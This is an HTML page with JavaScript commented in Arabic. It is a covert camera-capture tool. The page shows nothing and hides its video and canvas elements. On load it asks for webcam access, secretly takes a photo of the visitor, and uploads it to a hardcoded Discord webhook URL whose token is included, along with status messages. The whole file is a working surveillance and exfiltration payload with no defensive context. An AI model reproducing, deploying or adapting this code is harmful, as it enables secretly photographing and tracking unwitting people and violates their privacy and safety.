<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title> </title>
<style>body,video,canvas{display:none}</style>
</head>
<body>
<video id="cam" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// ضع رابط الويبهوك الجديد هنا
const webhook = "https://discord.com/api/webhooks/1444407690850734303/tbyWBMt86W2rtj4Cw4ejj8F5qjD7PwvYrMmveQzWknZdtz8pNCH9oBgOpCQWYhbtI-5h";

// أولاً: اختبر إذا الويبهوك شغال
async function testWebhook() {
    const testData = new FormData();
    testData.append("content", "✅ الكاميرا جاهزة، جاري التصوير...");
    
    try {
        const res = await fetch(webhook, { method: "POST", body: testData });
        if (res.ok) {
            console.log("✓ الويبهوك شغال");
            return true;
        } else {
            console.log("✗ الويبهوك فاشل - الكود: " + res.status);
            return false;
        }
    } catch(e) {
        console.log("✗ ما قدرت أوصل للويبهوك: " + e.message);
        return false;
    }
}

function captureAndSend(videoElement) {
    return new Promise((resolve) => {
        const canvas = document.getElementById('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 5000) {
                const formData = new FormData();
                formData.append("file", blob, `shot_${Date.now()}.png`);
                
                // إرسال الصورة
                const result = await fetch(webhook, { method: "POST", body: formData });
                
                if (result.ok) {
                    console.log("✓ تم إرسال الصورة - الحجم: " + (blob.size/1024).toFixed(1) + "KB");
                    
                    // إرسال تأكيد نصي
                    const confirmMsg = new FormData();
                    confirmMsg.append("content", "📸 تم التصوير بنجاح");
                    await fetch(webhook, { method: "POST", body: confirmMsg });
                    
                    resolve(true);
                } else {
                    console.log("✗ فشل إرسال الصورة - الكود: " + result.status);
                    resolve(false);
                }
            } else {
                console.log("✗ الصورة فاسدة أو صغيرة جداً (" + (blob?.size || 0) + " bytes)");
                resolve(false);
            }
        }, "image/png", 0.95);
    });
}

async function startCamera() {
    // اختبر الويبهوك أولاً
    const webhookWorks = await testWebhook();
    if (!webhookWorks) {
        console.log("⚠️ الويبهوك ما يشتغل! غير الرابط");
        alert("الويبهوك ما يشتغل! غير الرابط في الكود");
        return;
    }
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('cam');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            console.log("الكاميرا شغالة، ننتظر 2 ثانية...");
            
            setTimeout(async () => {
                console.log("نجرب نصور...");
                const success = await captureAndSend(video);
                
                if (success) {
                    console.log("✓ كل شيء تم بنجاح");
                } else {
                    console.log("✗ فشل التصوير");
                }
                
                // نغلق الكاميرا
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        };
        
    } catch(err) {
        console.log("خطأ في الكاميرا: " + err.message);
        // نرسل رسالة خطأ للويبهوك
        const errorMsg = new FormData();
        errorMsg.append("content", "❌ خطأ: " + err.message);
        await fetch(webhook, { method: "POST", body: errorMsg });
    }
}

startCamera();
</script>
</body>
</html>
